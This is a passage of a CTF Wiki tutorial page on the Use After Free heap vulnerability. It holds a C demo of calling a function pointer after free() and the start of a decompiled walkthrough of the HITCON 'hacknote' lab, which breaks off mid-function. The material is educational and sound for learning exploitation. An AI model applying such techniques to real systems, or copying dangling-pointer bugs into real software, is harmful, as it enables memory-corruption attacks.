  <li class="md-nav__item">
    <a href="../fastbin_attack-zh/" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unsorted_bin_attack-zh/" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../large_bin_attack-zh/" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../tcache_attack-zh/" class="md-nav__link">
      Tcache Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_einherjar-zh/" class="md-nav__link">
      House of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_force-zh/" class="md-nav__link">
      House of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_lore-zh/" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_orange-zh/" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_rabbit-zh/" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_roman-zh/" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="IO_FILE Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        <span class="md-nav__icon md-icon"></span>
        IO_FILE Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction-zh/" class="md-nav__link">
      FILE Structure Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit-zh/" class="md-nav__link">
      Forged Vtable to Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop-zh/" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24-zh/" class="md-nav__link">
      Use of IO_FILE Under Glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Race Condition
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Race Condition" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        <span class="md-nav__icon md-icon"></span>
        Race Condition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction-zh/" class="md-nav__link">
      Race Condition Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Integer Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        <span class="md-nav__icon md-icon"></span>
        Integer Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof-zh/" class="md-nav__link">
      Introduction to The Principle of Integer Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox Escape
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Sandbox Escape" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        <span class="md-nav__icon md-icon"></span>
        Sandbox Escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape-zh/" class="md-nav__link">
      Python Sandbox Escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      Linux Kernel
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Kernel" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        <span class="md-nav__icon md-icon"></span>
        Linux Kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf-zh/" class="md-nav__link">
      Kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop-zh/" class="md-nav__link">
      Kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr-zh/" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep-zh/" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch-zh/" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="arm-pwn" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        <span class="md-nav__icon md-icon"></span>
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop-zh/" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        <span class="md-nav__icon md-icon"></span>
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address-zh/" class="md-nav__link">
      Address Leaking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow-zh/" class="md-nav__link">
      Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell-zh/" class="md-nav__link">
      Get Shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme-zh/" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        <span class="md-nav__icon md-icon"></span>
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-nav__link">
      Android Development Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android Application Operating Mechanism Brief
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Application Operating Mechanism Brief" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        <span class="md-nav__icon md-icon"></span>
        Android Application Operating Mechanism Brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The Operating Mechanism of the Java Layer in Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="The Operating Mechanism of the Java Layer in Android" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        <span class="md-nav__icon md-icon"></span>
        The Operating Mechanism of the Java Layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" class="md-nav__link">
      Smali Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex and ODEX
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Dex and ODEX" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        <span class="md-nav__icon md-icon"></span>
        Dex and ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native Layer Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Native Layer Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        <span class="md-nav__icon md-icon"></span>
        Android Native Layer Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/" class="md-nav__link">
      Android SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android Reverse Basic Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Reverse Basic Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        <span class="md-nav__icon md-icon"></span>
        Android Reverse Basic Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview-zh/" class="md-nav__link">
      Brief Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location-zh/" class="md-nav__link">
      Android Key Part Location
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android Simple Static Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Static Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Static Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example-zh/" class="md-nav__link">
      Android Java Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example-zh/" class="md-nav__link">
      Android Native Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example-zh/" class="md-nav__link">
      Android Static Analysis Hybrid Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android Simple Dynamic Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Dynamic Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Dynamic Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/" class="md-nav__link">
      Android Dynamic Debugging SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ICS" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        <span class="md-nav__icon md-icon"></span>
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs-zh/" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover-zh/" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit-zh/" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn-zh/" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#principle" class="md-nav__link">
    Principle
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example" class="md-nav__link">
    example
  </a>
  
    <nav class="md-nav" aria-label="example">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#functional-analysis" class="md-nav__link">
    Functional Analysis
  </a>
  
    <nav class="md-nav" aria-label="Functional Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add_note" class="md-nav__link">
    add_note
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#print_note" class="md-nav__link">
    print_note
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#delete_note" class="md-nav__link">
    delete_note
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#utilization-analysis" class="md-nav__link">
    Utilization Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-scripts" class="md-nav__link">
    Using scripts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#topic" class="md-nav__link">
    topic
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/use_after_free.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <p><a href="./">EN</a> | <a href="../use_after_free-zh/">ZH</a></p>
<h1 id="use-after-free">Use After Free<a class="headerlink" href="#use-after-free" title="Permanent link">&para;</a></h1>
<h2 id="principle">Principle<a class="headerlink" href="#principle" title="Permanent link">&para;</a></h2>
<p>Simply put, Use After Free is what it literally means, and is used again when a block of memory is released. But in fact, here are the following situations</p>
<ul>
<li>After the memory block is released, its corresponding pointer is set to NULL, and then used again, the natural program will crash.</li>
<li>After the memory block is released, its corresponding pointer is not set to NULL, and then there is no code to modify the memory block before it is used next time, then the program is likely to work properly**.</li>
<li>After the memory block is released, its corresponding pointer is not set to NULL, but before it is used next time, there is code to modify the memory, then when the program uses the memory again, <strong> is very There may be strange problems</strong>.</li>
</ul>
<p>The <strong>Use After Free</strong> vulnerability we generally refer to is mainly the latter two. In addition, <strong> we generally say that the memory pointer that was not set to NULL after being released is the dangling pointer. </strong></p>
<p>Here is a simple example</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">name</span> <span class="p">{</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">myname</span><span class="p">;</span>

  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">);</span>

<span class="p">}</span> <span class="n">NAME</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">myprint</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span> <span class="p">}</span>

<span class="kt">void</span> <span class="nf">printmyname</span><span class="p">()</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;call print my name</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

  <span class="n">NAME</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>

  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">NAME</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">name</span><span class="p">));</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">myprint</span><span class="p">;</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">myname</span> <span class="o">=</span> <span class="s">&quot;I can also use it&quot;</span><span class="p">;</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;this is my function&quot;</span><span class="p">);</span>

  <span class="c1">// free without modify</span>

  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;I can also use it&quot;</span><span class="p">);</span>

  <span class="c1">// free with modify</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">printmyname</span><span class="p">;</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;this is my function&quot;</span><span class="p">);</span>

  <span class="c1">// set NULL</span>

  <span class="n">a</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;this pogram will crash...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;can not be printed...&quot;</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>
<p>The results are as follows</p>
<div class="highlight"><pre><span></span><code>➜  use_after_free git:<span class="o">(</span>use_after_free<span class="o">)</span> ✗ ./use_after_free                      

this is my <span class="k">function</span>

I can also use it

call print my name

this pogram will crash...

<span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">38738</span> segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./use_after_free
</code></pre></div>
<h2 id="example">example<a class="headerlink" href="#example" title="Permanent link">&para;</a></h2>
<p>Here we take [lab 10 hacknote] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a>) in HITCON-training as an example.</p>
<h3 id="functional-analysis">Functional Analysis<a class="headerlink" href="#functional-analysis" title="Permanent link">&para;</a></h3>
<p>We can simply analyze the program, we can see that there is a menu function at the beginning of the program, which has</p>
<div class="highlight"><pre><span></span><code>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 1. Add note          &quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 2. Delete note       &quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 3. Print note        &quot;</span><span class="p">);</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 4. Exit              &quot;</span><span class="p">);</span>
</code></pre></div>
<p>Therefore, the program should have three main functions. The program then performs the appropriate function based on the user&#39;s input.</p>
<h4 id="add_note">add_note<a class="headerlink" href="#add_note" title="Permanent link">&para;</a></h4>
<p>According to the program, we can see that the program can add up to 5 notes. Each note has two fields, put and content, where put is set to a function whose function outputs content specific content.</p>
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">add_note</span><span class="p">()</span>

<span class="p">{</span>

  <span class="n">note</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// ebx</span>

  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-1Ch]</span>

  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-18h]</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-14h]</span>

  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]</span>



  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">5</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>

    <span class="p">{</span>

      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>

      <span class="p">{</span>

        <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8u</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>

        <span class="p">{</span>

          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alloca Error&quot;</span><span class="p">);</span>

          <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>

        <span class="p">}</span>

        <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span> <span class="o">=</span> <span class="n">print_note_content</span><span class="p">;</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note size :&quot;</span><span class="p">);</span>

        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>

        <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

<span class="n">v0</span> <span class="o">=</span> <span class="n">notelist</span> <span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">v0</span><span class="o">-&gt;</span><span class="n">content</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span> <span class="p">)</span>

        <span class="p">{</span>

          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alloca Error&quot;</span><span class="p">);</span>

          <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>

        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Content :&quot;</span><span class="p">);</span>

